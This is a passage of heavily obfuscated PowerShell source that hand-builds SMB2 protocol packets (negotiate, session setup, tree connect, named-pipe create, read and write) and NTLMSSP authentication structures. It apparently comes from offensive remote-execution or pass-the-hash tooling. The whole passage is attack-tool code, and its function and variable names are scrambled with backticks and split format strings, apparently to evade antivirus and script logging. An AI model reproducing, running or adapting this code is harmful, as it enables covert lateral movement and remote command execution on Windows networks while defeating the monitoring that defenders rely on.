        ${paC`KE`T_sM`B2he`AD`Er}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{4}{3}{0}{5}" -f'ionI','SMB2He','a','_Sess','der','D'),${pAcke`T_sEss`Ion`_ID})
        ${PACke`T`_sMb`2hEAD`er}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{3}{1}"-f'Header_','ignature','SMB2','S'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return ${Pac`Ket`_`smB2heAdeR}
    }

    function g`e`T`-`p`ACK`eTS`mB2`NEGOtIaTePRo`ToCo`lreq`Uest()
    {
        ${pa`C`K`eT`_s`mb2n`ego`Tia`TePRoTocolrEQuESt} = &("{3}{0}{2}{1}"-f 'bj','t','ec','New-O') ("{1}{6}{8}{5}{7}{3}{0}{4}{2}"-f 'D','System','ary','red','iction','ed.Or','.Collecti','de','ons.Specializ')
        ${PACk`ET_`SMB2`NEgoT`IaTE`pRO`T`Oc`OLR`e`QUeST}.("{1}{0}"-f 'd','Ad').Invoke(("{2}{5}{0}{3}{1}{10}{6}{9}{7}{4}{8}" -f'iate','Re','SMB2Neg','Protocol','e','ot','est_St','tur','Size','ruc','qu'),[Byte[]](0x24,0x00))
        ${p`A`c`ket_SmB2Nego`TiaTe`PROtOColr`EQu`E`sT}.("{1}{0}"-f'dd','A').Invoke(("{5}{7}{2}{3}{8}{1}{6}{4}{10}{9}{0}" -f 'nt','Req','egot','iatePr','st_D','SM','ue','B2N','otocol','tCou','ialec'),[Byte[]](0x02,0x00))
        ${P`AcKet`_S`Mb2ne`GO`Tiat`EpRo`T`o`CoL`REQUesT}.("{0}{1}"-f 'Ad','d').Invoke(("{7}{8}{2}{11}{5}{10}{9}{0}{3}{4}{1}{6}"-f't_','rityMo','tiateP','Sec','u','t','de','S','MB2Nego','ues','ocolReq','ro'),[Byte[]](0x01,0x00))
        ${PACk`et_SMb2n`EG`OTiA`TeProtO`CoLre`QueSt}.("{1}{0}" -f'd','Ad').Invoke(("{2}{6}{3}{0}{1}{8}{7}{4}{9}{5}{10}"-f't','iatePr','SMB2','go','ocolR','uest_Res','Ne','t','o','eq','erved'),[Byte[]](0x00,0x00))
        ${p`ACkE`T_SMb2nEgoTIATEPrO`TOCOL`REqU`esT}.("{1}{0}"-f'dd','A').Invoke(("{10}{11}{2}{3}{8}{7}{9}{5}{1}{6}{4}{0}" -f's','pab','at','eProt','tie','equest_Ca','ili','col','o','R','SMB2','Negoti'),[Byte[]](0x40,0x00,0x00,0x00))
        ${P`AckET_SmB2n`E`GOtI`ATEPRO`ToCO`Lrequ`EsT}.("{1}{0}"-f 'dd','A').Invoke(("{8}{7}{4}{6}{1}{2}{0}{5}{3}"-f 'lRequest_Client','oc','o','D','iatePr','GUI','ot','Negot','SMB2'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${Pa`CKET_sm`B2Negotiat`Ep`R`Ot`oc`O`lrEQUesT}.("{1}{0}"-f 'dd','A').Invoke(("{8}{3}{11}{4}{9}{2}{10}{6}{12}{13}{7}{0}{1}{5}" -f 'tiateConte','x','te','2Neg','i','tOffset','rotocolR','_Nego','SMB','a','P','ot','eques','t'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PA`CkET`_SMB2NeGotiA`TEpr`otO`coL`Re`QU`esT}.("{1}{0}"-f 'd','Ad').Invoke(("{5}{6}{0}{4}{3}{1}{2}{7}{8}" -f'ego','uest_Negot','iateCo','colReq','tiateProto','SMB2','N','n','textCount'),[Byte[]](0x00,0x00))
        ${PAck`ET_smB`2N`eGo`TiATE`prot`oCOlREquest}.("{1}{0}" -f'dd','A').Invoke(("{1}{5}{6}{7}{0}{2}{3}{4}"-f'R','SMB2N','eser','ve','d2','egoti','ateProtocolReq','uest_'),[Byte[]](0x00,0x00))
        ${P`AcKE`T_SMb2negOTi`Ate`p`RotOCO`lrequ`E`st}.("{1}{0}"-f'd','Ad').Invoke(("{8}{4}{0}{5}{3}{2}{6}{1}{9}{7}"-f 'o','lRequest_','oc','t','MB2Neg','tiatePro','o','ct','S','Diale'),[Byte[]](0x02,0x02))
        ${pacKE`T_SMb2NEGOTi`AteprO`TocOL`REQ`U`e`St}.("{0}{1}"-f 'A','dd').Invoke(("{5}{2}{0}{1}{3}{4}{6}" -f'tePro','tocolReque','gotia','st_Dial','ec','SMB2Ne','t2'),[Byte[]](0x10,0x02))

        return ${pAc`ket_s`MB2nE`g`oTIAteprotOcOlr`eque`St}
    }

    function gET-P`AC`KETsMB2s`eSs`i`onsE`TupReQuESt()
    {
        param([Byte[]]${Pa`cKE`T`_sECUrITy_bL`Ob})

        [Byte[]]${PAck`ET`_`SE`CUriTY_B`L`ob_`l`ength} =   (&("{0}{2}{1}"-f'Var','AbLE','i') w2Ehx  -VaL )::("{2}{1}{0}"-f 'ytes','B','Get').Invoke(${PaCkEt`_s`E`cuRItY_bl`Ob}."L`eNgtH")
        ${PAckEt`_SeC`URItY`_`BL`ob`_lEN`gth} = ${PAc`K`et`_s`Ec`URitY_`BlOb`_l`ENgtH}[0,1]

        ${pacK`eT_`s`mB`2SEssI`oNsET`Up`REquEsT} = &("{3}{2}{0}{1}" -f'b','ject','O','New-') ("{9}{6}{1}{5}{3}{2}{0}{4}{7}{8}" -f 'ialized','stem.Co','Spec','ons.','.','llecti','y','OrderedDictio','nary','S')
        ${P`ACKEt_SmB2`sE`SSI`oN`SEtu`p`R`eq`Uest}.("{0}{1}"-f 'A','dd').Invoke(("{7}{3}{5}{1}{4}{8}{9}{2}{0}{6}"-f'tureS','Se','ruc','MB','ssionSetu','2','ize','S','pReques','t_St'),[Byte[]](0x19,0x00))
        ${p`A`Cke`T_SM`B2SE`sSIonSE`TuP`ReQ`UEst}.("{1}{0}"-f'dd','A').Invoke(("{3}{1}{0}{4}{2}"-f'etupReq','sionS','lags','SMB2Ses','uest_F'),[Byte[]](0x00))
        ${PA`c`kE`T_s`mB`2Se`ssIoNsETU`prEQ`UeST}.("{1}{0}"-f'd','Ad').Invoke(("{6}{3}{7}{0}{2}{4}{1}{5}" -f'i','equ','onSetup','B2S','R','est_SecurityMode','SM','ess'),[Byte[]](0x01))
        ${pAcket_sMb2SES`S`io`N`Setupr`E`qu`eST}.("{0}{1}"-f'A','dd').Invoke(("{0}{4}{9}{2}{10}{5}{6}{3}{8}{7}{1}"-f 'SMB2','s','p','Ca','Sessi','q','uest_','itie','pabil','onSetu','Re'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PackET`_sM`B2S`eSsIo`Ns`E`TUpr`eque`st}.("{1}{0}" -f'd','Ad').Invoke(("{0}{4}{2}{5}{1}{6}{3}"-f 'S','ha','io','l','MB2Sess','nSetupRequest_C','nne'),[Byte[]](0x00,0x00,0x00,0x00))
        ${pa`C`keT_smB2S`ESsIon`SET`UpRequEst}.("{1}{0}"-f 'dd','A').Invoke(("{6}{1}{11}{0}{12}{2}{3}{10}{4}{9}{7}{8}{5}"-f 'pR','i','st_S','ec','rityBu','t','SMB2Sess','erOf','fse','ff','u','onSetu','eque'),[Byte[]](0x58,0x00))
        ${pA`cKeT_smB2S`eSSI`o`NSe`T`Upr`eQUeSt}.("{1}{0}" -f 'dd','A').Invoke(("{9}{4}{5}{12}{3}{6}{11}{10}{7}{0}{13}{1}{8}{2}"-f 'tyB','n','h','ues','MB2S','essionS','t','ecuri','gt','S','S','_','etupReq','ufferLe'),${PACk`E`T_SeCuRITy`_bLO`B_Len`Gth})
        ${PA`C`Ke`T_sMB2`seSsIoNSEtUpReq`UEST}.("{0}{1}" -f'A','dd').Invoke(("{9}{11}{0}{1}{6}{2}{3}{7}{8}{4}{10}{5}"-f 'sion','S','qu','est_','usSess','nID','etupRe','Prev','io','SM','io','B2Ses'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${p`ACkET_sMb2`SE`Ss`ionsE`TupR`eqU`EST}.("{0}{1}"-f'A','dd').Invoke(("{4}{3}{5}{2}{0}{1}"-f'est_B','uffer','onSetupRequ','MB','S','2Sessi'),${PA`CKet_`sEcUR`iTY_B`Lob})

        return ${pa`ck`Et_Sm`B2`sessi`On`SetuPReqUeST} 
    }

    function g`eT-`paCke`TSmb2tRE`ECON`N`ECTReque`sT()
    {
        param([Byte[]]${P`ACK`e`T_patH})

        [Byte[]]${PA`cK`et_`P`At`h_Len`gtH} =   ${W`2`EHx}::("{1}{2}{0}"-f 'tes','Ge','tBy').Invoke(${paCkET`_pA`Th}."l`EN`gtH")
        ${PaC`Ket_`P`ATh_LENG`TH} = ${PAc`Ke`T`_`Pa`T`H_lEngtH}[0,1]

        ${pacK`eT`_S`m`B`2tREecOnNECtreQUEst} = &("{1}{0}{2}"-f 'Obje','New-','ct') ("{12}{9}{1}{8}{3}{11}{0}{7}{4}{13}{10}{5}{6}{2}"-f 'ali','ol','nary','ions.S','r','c','tio','zed.Orde','lect','C','dDi','peci','System.','e')
        ${Pa`ckET_SMb`2tRe`ECO`N`NECtREquESt}.("{0}{1}" -f'Ad','d').Invoke(("{2}{3}{4}{1}{0}{6}{5}" -f'ectRequest_Str','onn','SMB','2','TreeC','ctureSize','u'),[Byte[]](0x09,0x00))
        ${paCk`Et_S`mB2`TreeCOn`NEc`TReqUESt}.("{0}{1}" -f'Ad','d').Invoke(("{1}{4}{6}{8}{3}{7}{5}{0}{2}{9}" -f 'e','S','st_Res','reeConn','MB','u','2','ectReq','T','erved'),[Byte[]](0x00,0x00))
        ${PaCk`E`T_SmB2t`ReEC`ONNEC`TR`E`QUeSt}.("{1}{0}" -f 'd','Ad').Invoke(("{7}{3}{1}{8}{0}{4}{2}{6}{5}" -f'tReq','Conn','Pa','B2Tree','uest_','set','thOff','SM','ec'),[Byte[]](0x48,0x00))
        ${pack`eT_smb`2tr`eECon`NeCTR`E`quEST}.("{1}{0}"-f'dd','A').Invoke(("{3}{0}{4}{8}{7}{5}{2}{9}{1}{6}" -f'2','eng','st_Path','SMB','Tre','nectReque','th','Con','e','L'),${P`A`cKE`T_`Pat`H_LE`NGtH})
        ${pACke`T_SMB2t`R`eeCO`NNE`cTrE`Q`U`eST}.("{0}{1}"-f'A','dd').Invoke(("{3}{2}{1}{0}{4}{5}" -f'e','TreeConn','MB2','S','ctRe','quest_Buffer'),${PaCK`eT_P`ATH})

        return ${P`AcKeT_`SmB2`TrEEcoNne`C`TrEQu`E`St}
    }

    function G`E`T-paCKetSmb2cRE`A`T`eReQ`U`es`Tf`ILE()
    {
        param([Byte[]]${PA`CKeT_NAm`E`d_pIPe})

        ${pA`cKeT_`N`AMed_`PiP`e_l`ENGTh} =  (  &("{0}{1}" -f'vAriaB','Le')  ('w2'+'EhX') -vaLUeON)::("{2}{0}{1}" -f 'By','tes','Get').Invoke(${paCKeT`_`NA`m`ED_`PipE}."lE`NGth")
        ${PAcKet_n`AM`E`D_pi`Pe_LenGtH} = ${P`AcK`eT_N`AME`d_pI`Pe_lE`N`gTh}[0,1]

        ${pACKe`T_S`mB2`cREateR`E`q`U`EsTFI`Le} = &("{0}{2}{1}" -f'New','bject','-O') ("{13}{9}{12}{7}{2}{11}{3}{6}{1}{14}{4}{8}{0}{10}{5}" -f'ct','ia','ollec','s.','Ordered','nary','Spec','C','Di','tem','io','tion','.','Sys','lized.')
        ${pAcKEt_S`mB2c`Reate`R`eq`UesTFi`lE}.("{1}{0}" -f'dd','A').Invoke(("{6}{2}{0}{7}{4}{5}{1}{3}" -f'eateRequest','Stru','r','ctureSize','l','e_','SMB2C','Fi'),[Byte[]](0x39,0x00))
        ${P`AckET_SmB2CR`eATeRE`qUe`ST`F`IlE}.("{1}{0}" -f'dd','A').Invoke(("{1}{4}{3}{2}{0}"-f'_Flags','SMB2Cre','equestFile','teR','a'),[Byte[]](0x00))
        ${PaCK`E`T_sMB2CrE`A`TErEQU`E`sT`FI`Le}.("{1}{0}"-f 'd','Ad').Invoke(("{6}{2}{1}{4}{5}{3}{0}" -f'lockLevel','q','MB2CreateRe','p','uestF','ile_RequestedO','S'),[Byte[]](0x00))
        ${pA`C`KEt`_sm`B2`CReAteReq`Ue`sTfi`lE}.("{1}{0}" -f 'dd','A').Invoke(("{7}{5}{1}{10}{8}{2}{9}{3}{4}{6}{0}"-f 'on','e','Fi','e_I','mpers','r','onati','SMB2C','eRequest','l','at'),[Byte[]](0x02,0x00,0x00,0x00))
        ${P`AC`keT_SMb2crEAt`ERe`qU`eSt`FiLe}.("{1}{0}"-f 'dd','A').Invoke(("{8}{4}{3}{10}{9}{1}{0}{5}{6}{2}{7}"-f 'F','st','eat','e','CreateR','ile','_SMBCr','eFlags','SMB2','e','qu'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${p`Ac`kET_sMb2c`Re`A`TeREq`UEstF`i`LE}.("{1}{0}" -f 'dd','A').Invoke(("{5}{6}{4}{2}{7}{1}{0}{3}{8}{9}"-f 'File','uest','e','_','teR','SMB2Cre','a','q','Res','erved'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${P`A`ckEt_sMb`2crEA`Te`RequeSTFILE}.("{1}{0}" -f'd','Ad').Invoke(("{9}{4}{8}{5}{3}{1}{6}{2}{7}{0}"-f's','il','Acce','estF','B','u','e_Desired','s','2CreateReq','SM'),[Byte[]](0x03,0x00,0x00,0x00))
        ${pA`CkeT`_SMB`2`cREA`TeR`EQues`T`FIlE}.("{0}{1}" -f 'A','dd').Invoke(("{1}{0}{2}{7}{3}{6}{10}{8}{9}{5}{4}" -f 'eRe','SMB2Creat','qu','File_Fil','tes','u','e','est','i','b','Attr'),[Byte[]](0x80,0x00,0x00,0x00))
        ${Pa`C`k`Et_`S`MB2C`ReAT`Er`eQuesTFILE}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{9}{8}{4}{0}{1}{6}{3}{7}{5}"-f'RequestFile_','S','SM','are','e','ss','h','Acce','eat','B2Cr'),[Byte[]](0x01,0x00,0x00,0x00))
        ${paCKE`T_smb`2C`REA`T`e`RE`QUEsTfiLe}.("{0}{1}"-f 'Ad','d').Invoke(("{7}{0}{3}{5}{1}{6}{2}{4}" -f'2Crea','eDi','i','teReque','on','stFile_Creat','sposit','SMB'),[Byte[]](0x01,0x00,0x00,0x00))
        ${pacKeT`_`Sm`B2`Cr`eatEre`QU`esTfilE}.("{1}{0}"-f'd','Ad').Invoke(("{3}{9}{4}{7}{0}{8}{10}{5}{2}{1}{6}" -f 'u','ption','O','SMB','e','_Create','s','q','e','2CreateR','stFile'),[Byte[]](0x40,0x00,0x00,0x00))
        ${PaCKe`T_`Smb2c`R`ea`TeRE`qU`Est`FILE}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{5}{2}{1}{0}{3}" -f'eOffs','estFile_Nam','reateRequ','et','SMB2','C'),[Byte[]](0x78,0x00))
        ${Pac`K`et_s`mB`2CrEAt`eRE`quE`stfILE}.("{1}{0}" -f 'dd','A').Invoke(("{2}{8}{4}{1}{7}{3}{0}{6}{5}{9}" -f'estFile_NameL','R','SMB','u','reate','t','eng','eq','2C','h'),${pAcKet`_`NameD_pI`p`e`_LEnG`Th})
        ${PAcK`ET`_S`mb2`crEatEr`EQUEStfILE}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{1}{3}{4}{0}{5}{7}{6}" -f'RequestFile_CreateC','B2','SM','Cr','eate','on','Offset','texts'),[Byte[]](0x00,0x00,0x00,0x00))
        ${Pac`ke`T_SmB`2CRe`ATer`EqUES`TFilE}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{2}{12}{0}{10}{5}{9}{8}{3}{1}{7}{6}{11}" -f 'Cr','tsL','teR','ex','SMB2Crea','eCo','ng','e','t','n','eat','th','equestFile_'),[Byte[]](0x00,0x00,0x00,0x00))
        ${p`AC`k`eT_S`m`B2`cREaT`ErEquEst`FiLE}.("{0}{1}" -f'Ad','d').Invoke(("{4}{2}{3}{1}{0}"-f'fer','_Buf','eRe','questFile','SMB2Creat'),${p`ACk`ET_nam`e`D_P`ipE})

        return ${pA`c`kEt_S`m`B`2cREaT`e`Re`qUeStfIle}
    }

    function get-PaCkets`mB2REA`d`R`eqUESt()
    {
        param ([Byte[]]${P`ACK`Et_f`IL`E_ID})

        ${pAcKE`T`_sm`B2reAD`R`eQuEST} = &("{0}{3}{2}{1}" -f'Ne','t','jec','w-Ob') ("{12}{4}{7}{14}{11}{1}{9}{0}{3}{2}{5}{13}{6}{10}{8}"-f'tions.Spec','le','iz','ial','yst','ed.O','tio','e','ary','c','n','Col','S','rderedDic','m.')
        ${pAC`k`e`T_smB2`REaD`R`EquesT}.("{0}{1}" -f'Ad','d').Invoke(("{0}{2}{1}{4}{3}"-f'SMB2ReadR','tru','equest_S','ze','ctureSi'),[Byte[]](0x31,0x00))
        ${PAc`KEt`_sm`B2`ReA`DrEQU`eSt}.("{1}{0}"-f 'd','Ad').Invoke(("{4}{2}{1}{6}{5}{3}{0}" -f 'g','Rea','B2','_Paddin','SM','t','dReques'),[Byte[]](0x50))
        ${PA`CkE`T_smB`2Re`ADRE`qUE`ST}.("{1}{0}" -f 'dd','A').Invoke(("{4}{0}{2}{3}{1}" -f'adR','s','eques','t_Flag','SMB2Re'),[Byte[]](0x00))
        ${pa`C`keT_smB2reaD`R`EQue`st}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{6}{3}{1}{5}{4}{2}" -f 'S','eq','gth','dR','Len','uest_','MB2Rea'),[Byte[]](0x00,0x00,0x10,0x00))
        ${P`A`c`k`ET_s`Mb2reaDrEQ`UE`St}.("{1}{0}"-f'dd','A').Invoke(("{5}{2}{1}{3}{4}{6}{0}" -f 't_Offset','B2Re','M','a','dRe','S','ques'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${P`AC`KET_smb2RE`A`dREq`U`est}.("{0}{1}"-f'Ad','d').Invoke(("{1}{0}{3}{4}{2}"-f'MB','S','eID','2R','eadRequest_Fil'),${P`Ac`kET_FIl`E_Id})
        ${PAc`kET_sMB2r`Ea`dr`eQUESt}.("{0}{1}"-f'Ad','d').Invoke(("{5}{1}{0}{6}{4}{2}{7}{8}{3}"-f'R','2','est_M','t','Requ','SMB','ead','inimumCo','un'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PacKET_Sm`B`2re`Ad`RequEst}.("{0}{1}"-f'A','dd').Invoke(("{0}{5}{4}{3}{2}{1}"-f 'S','annel','h','_C','eadRequest','MB2R'),[Byte[]](0x00,0x00,0x00,0x00))
        ${P`ACKet_s`M`B2r`e`ADRe`que`sT}.("{0}{1}"-f'Ad','d').Invoke(("{7}{0}{6}{1}{2}{5}{3}{9}{8}{4}" -f'B','Re','ma','n','es','i','2ReadRequest_','SM','yt','ingB'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PAc`ket`_`sMb2ReADReqU`eST}.("{0}{1}"-f'A','dd').Invoke(("{7}{6}{1}{2}{8}{5}{3}{9}{4}{0}"-f 't','dRequ','es','nne','ffse','eadCha','2Rea','SMB','t_R','lInfoO'),[Byte[]](0x00,0x00))
        ${paCke`T_SmB`2R`eaDR`Eq`UEst}.("{1}{0}" -f'dd','A').Invoke(("{0}{4}{5}{8}{7}{9}{10}{11}{2}{3}{6}{1}"-f 'SM','h','n','elInfoL','B','2ReadRequ','engt','_R','est','ead','Cha','n'),[Byte[]](0x00,0x00))
        ${pA`ck`e`T_`S`mB`2re`ADREquEst}.("{1}{0}"-f 'd','Ad').Invoke(("{4}{2}{1}{3}{0}" -f 'er','quest_','eadRe','Buff','SMB2R'),[Byte[]](0x30))

        return ${PA`cK`eT_sMb2`R`EADREqUeST}
    }

    function ge`T`-PAC`KETsm`B2`WRIT`EREqueST()
    {
        param([Byte[]]${pac`K`ET_FILE`_`Id},[Int]${pA`cK`Et`_rPC_`LENgTh})

        [Byte[]]${P`ACKEt_wRI`T`E`_lENgTH} =   ${W`2`eHX}::("{1}{0}"-f'ytes','GetB').Invoke(${pACkE`T`_Rp`c_Le`NgtH})

        ${p`ACKeT_S`mb2w`R`iteREQu`ESt} = &("{0}{2}{1}"-f'New','bject','-O') ("{0}{2}{1}{4}{6}{7}{5}{3}" -f'System','lection','.Col','edDictionary','s','Order','.Specialized','.')
        ${PacKET_smB2`wrIT`E`R`equest}.("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{3}{1}{5}{7}{6}{4}" -f'S','ue','MB2W','riteReq','Size','s','_Structure','t'),[Byte[]](0x31,0x00))
        ${pAcKE`T_s`Mb2`wr`it`e`ReqUEsT}.("{0}{1}"-f'A','dd').Invoke(("{4}{3}{1}{0}{5}{2}{6}"-f 'equ','2WriteR','st_','MB','S','e','DataOffset'),[Byte[]](0x70,0x00))
        ${PacK`et_Sm`B2wrIT`eREqUE`ST}.("{1}{0}"-f 'd','Ad').Invoke(("{5}{3}{0}{2}{1}{4}" -f 'iteReques','L','t_','Wr','ength','SMB2'),${pACKE`T_w`RiTE_lE`N`G`TH})
        ${pAckEt_SM`B2WR`I`TEReq`UeST}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{3}{4}{1}" -f'Wri','_Offset','SMB2','teRequ','est'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${Pa`CkET_Sm`B2wRI`T`E`RE`quEsT}.("{1}{0}"-f 'dd','A').Invoke(("{0}{5}{2}{4}{3}{1}"-f'SMB2','eID','iteRe','t_Fil','ques','Wr'),${pAc`k`eT_FIle`_`Id})
        ${p`Ac`KE`T_`Sm`B2WRitEre`QuEsT}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{4}{3}{6}{5}{1}{0}"-f 'hannel','t_C','S','2Wr','MB','s','iteReque'),[Byte[]](0x00,0x00,0x00,0x00))
        ${Pa`C`kET_sM`B`2wrIter`EQUest}.("{1}{0}"-f'dd','A').Invoke(("{7}{2}{5}{8}{4}{0}{3}{1}{6}"-f'em','iningByte','2Wr','a','R','iteRequest','s','SMB','_'),[Byte[]](0x00,0x00,0x00,0x00))
        ${pac`kE`T_s`MB2`wr`itEr`EQuest}.("{1}{0}" -f'dd','A').Invoke(("{4}{6}{5}{0}{1}{7}{2}{3}" -f'teReque','st_WriteChan','oOf','fset','SM','ri','B2W','nelInf'),[Byte[]](0x00,0x00))
        ${p`A`ckET_SMB2WRIT`e`Re`que`St}.("{1}{0}" -f'dd','A').Invoke(("{1}{4}{10}{5}{9}{7}{0}{3}{11}{6}{2}{8}"-f'es','SM','nelI','t','B','WriteR','an','u','nfoLength','eq','2','_WriteCh'),[Byte[]](0x00,0x00))
        ${pa`cKet`_sMB2WRiTE`REQu`EsT}.("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{3}{4}{0}" -f'_Flags','B2Write','SM','R','equest'),[Byte[]](0x00,0x00,0x00,0x00))

        return ${pa`C`kET`_`sM`B2writer`EqUESt}
    }

    function G`e`T`-pAcket`smb`2ClOseREqu`eST()
    {
        param ([Byte[]]${PackET_`F`I`LE_`id})

        ${PackET_S`mB2cLoS`erEQ`U`esT} = &("{0}{1}{2}"-f'New-Obj','e','ct') ("{9}{10}{3}{12}{4}{13}{5}{2}{1}{14}{8}{0}{11}{7}{6}" -f'r','O','d.','Co','s.Spe','ize','y','ictionar','e','Syst','em.','edD','llection','cial','rd')
        ${P`ACkeT_`SMB2c`LosERe`qU`esT}.("{0}{1}"-f'Ad','d').Invoke(("{6}{1}{2}{7}{3}{5}{8}{0}{4}"-f 't','os','eRe','e','ureSize','st','SMB2Cl','qu','_Struc'),[Byte[]](0x18,0x00))
        ${PaCk`Et`_smb2cLose`ReqUe`sT}.("{0}{1}"-f'Ad','d').Invoke(("{2}{4}{5}{3}{6}{0}{1}"-f'Request_Fla','gs','S','2','M','B','Close'),[Byte[]](0x00,0x00))
        ${PackE`T_`s`M`B`2`cl`oSerEQUeSt}.("{0}{1}" -f 'Ad','d').Invoke(("{5}{4}{2}{3}{1}{0}" -f'rved','ese','est_','R','oseRequ','SMB2Cl'),[Byte[]](0x00,0x00,0x00,0x00))
        ${packEt_S`mb2c`lOseRe`q`UEsT}.("{1}{0}"-f'd','Ad').Invoke(("{4}{0}{1}{3}{5}{2}" -f'B2CloseR','e','D','qu','SM','est_FileI'),${P`AcKE`T_fiL`e_Id})

        return ${paCKEt_`SM`B`2ClOSereqU`est}
    }

    function g`et-PACKet`sM`B2trEe`dIscONNeCT`REQueSt()
    {
        ${p`Ac`Ket_SMB2`TrEEDIs`CONnecTre`qUest} = &("{0}{1}{2}" -f'New-Obje','c','t') ("{3}{0}{5}{8}{11}{6}{10}{4}{7}{1}{12}{9}{2}{13}" -f 'yst','edDi','ar','S','cia','e','llecti','lized.Order','m','on','ons.Spe','.Co','cti','y')
        ${PaCKEt_Smb2`T`RE`eDi`S`coNNEC`TRe`Quest}.("{0}{1}"-f'A','dd').Invoke(("{4}{8}{10}{7}{6}{1}{5}{3}{11}{9}{2}{0}" -f'ize','e','StructureS','tRe','S','c','n','con','MB2Tree','t_','Dis','ques'),[Byte[]](0x04,0x00))
        ${PAC`Ket_`SmB2t`R`eeDIsCo`NNeCTreQU`eST}.("{0}{1}"-f'A','dd').Invoke(("{3}{2}{6}{5}{4}{1}{0}{7}{8}" -f 'e','st_Res','eDisc','SMB2Tre','tReque','ec','onn','rv','ed'),[Byte[]](0x00,0x00))

        return ${pACke`T_Smb2`TR`eedIsCoNn`E`C`T`REqU`E`St}
    }

    function g`Et-`PaCkEtsMB2SessIOnlOgO`F`FReQuE`St()
    {
        ${paCKEt`_Smb2sESsI`ON`l`ogOf`FrEQuest} = &("{0}{1}{2}" -f 'New-O','bj','ect') ("{14}{8}{3}{13}{0}{4}{6}{12}{11}{7}{9}{2}{1}{5}{10}" -f 'i','n','dDictio','tem.','o','a','ns','l','s','ized.Ordere','ry','ecia','.Sp','Collect','Sy')
        ${Pa`Ck`eT_`sMb2se`s`SionLOgOF`FrEQUesT}.("{0}{1}" -f 'A','dd').Invoke(("{1}{5}{4}{2}{6}{0}{3}" -f'st_','SMB','goffReq','StructureSize','ionLo','2Sess','ue'),[Byte[]](0x04,0x00))
        ${p`A`cKet_SMb2`seSsiO`NlOgOff`R`EquEst}.("{1}{0}" -f'dd','A').Invoke(("{1}{3}{4}{2}{7}{0}{6}{5}" -f'e','SM','offRe','B2Se','ssionLog','ved','ser','quest_R'),[Byte[]](0x00,0x00))

        return ${pACKet_sMB2`sEs`SIONlo`G`OffR`eQUEst}
    }

    

    function gE`T`-Pa`ckETnT`lMS`sPnEgotIaTE()
    {
        param([Byte[]]${p`ACket`_NEG`otI`A`Te`_flagS},[Byte[]]${p`ACK`eT_`VerSion})

        [Byte[]]${PAcKeT_N`TlMssP_l`En`G`TH} =   ${W`2`EHx}::("{2}{0}{1}"-f'etByt','es','G').Invoke(32 + ${p`AckEt`_ver`s`IoN}."lE`N`Gth")
        ${Pa`Ck`ET_nT`LmssP_lE`NG`TH} = ${PACKeT_N`T`l`MsS`p`_lE`NgtH}[0]
        [Byte[]]${pA`ckE`T_`AS`N`_l`engTh_1} = ${pACk`ET`_NTLM`SSP_lenG`TH}[0] + 32
        [Byte[]]${paCKEt_A`sN`_lEN`g`TH_2} = ${pA`c`ke`T_NTL`mSs`P_`LENGth}[0] + 22
        [Byte[]]${pAc`K`E`T_AsN`_l`EnGtH`_3} = ${pa`c`keT_nTLMs`SP`_`leNGth}[0] + 20
        [Byte[]]${p`AckET_As`N_LENgT`h`_4} = ${PAcKe`T_NT`LM`s`Sp_le`N`gth}[0] + 2

        ${pACket_`NT`lMSsP`NEgOT`IatE} = &("{1}{0}{3}{2}"-f 'Ob','New-','t','jec') ("{2}{0}{1}{11}{3}{7}{4}{10}{6}{8}{9}{5}"-f's','tem','Sy','ollec','.Spec','ry','.Ordere','tions','dDict','iona','ialized','.C')
        ${P`ACK`Et_nTl`M`sSP`NegOtia`Te}.("{1}{0}"-f'd','Ad').Invoke(("{8}{1}{7}{9}{0}{5}{6}{4}{3}{2}{10}" -f'oti','TLMSS','nI','Toke','text','ate_I','nitialCon','PNe','N','g','D'),[Byte[]](0x60)) 
        ${pA`cKET_NTL`mss`PneGo`T`iA`TE}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{4}{8}{10}{6}{3}{1}{5}{11}{7}{9}"-f'NTLMSS','e','PNe','t','goti','x','on','oke','ate_Initia','nLength','lc','tT'),${PAc`K`e`T_asN_le`NGTH`_1})
        ${pa`C`K`et_ntLMsSPNEg`o`TIate}.("{1}{0}"-f'dd','A').Invoke(("{2}{3}{1}{0}{4}" -f'SSPNegotiate_ThisMec','M','NT','L','hID'),[Byte[]](0x06))
        ${PACkeT_`NtlMS`s`P`NEGOT`I`ATE}.("{1}{0}"-f'd','Ad').Invoke(("{5}{2}{1}{4}{3}{0}" -f 'gth','egoti','SSPN','te_ThisMechLen','a','NTLM'),[Byte[]](0x06))
        ${P`AcKEt_NTL`M`Ss`pnegoTi`ATe}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{3}{0}"-f 'te_OID','L','NT','MSSPNegotia'),[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        ${PACke`T`_nTl`M`sS`pneGOT`iatE}.("{0}{1}"-f'Ad','d').Invoke(("{0}{6}{3}{4}{2}{5}{1}"-f'NTL','okenID','nnerCont','Negotiat','e_I','extT','MSSP'),[Byte[]](0xa0))
